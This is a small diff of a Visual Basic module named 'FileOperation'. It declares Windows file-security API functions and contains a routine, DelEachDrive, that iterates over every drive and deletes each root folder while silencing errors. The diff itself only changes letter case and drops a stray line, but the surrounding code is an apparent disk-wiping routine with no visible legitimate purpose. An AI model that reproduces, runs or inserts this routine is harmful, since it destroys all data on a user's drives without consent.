@@ -1,5 +1,4 @@
 Attribute VB_Name = "FileOperation"
-Public T
 Private Declare Function SetFileSecurity Lib "advapi32.dll" Alias "SetFileSecurityA" (ByVal lpFileName As String, ByVal SecurityInformation As Long, pSecurityDescriptor As Any) As Long
 
 Private Declare Function GetFileSecurity Lib "advapi32.dll" Alias "GetFileSecurityA" (ByVal lpFileName As String, ByVal RequestedInformation As Long, pSecurityDescriptor As Any, ByVal nLength As Long, lpnLengthNeeded As Long) As Long
@@ -30,7 +29,7 @@ Sub DelEachDrive()
 On Error Resume Next
         Dim a As New FileSystemObject, b As Drive
         For Each b In a.Drives
-                DeleteFolder b.RootFolder.Path
+                DeleteFolder b.rootfolder.Path
         Next
 End Sub
 Sub DeleteFolder(Path As String)
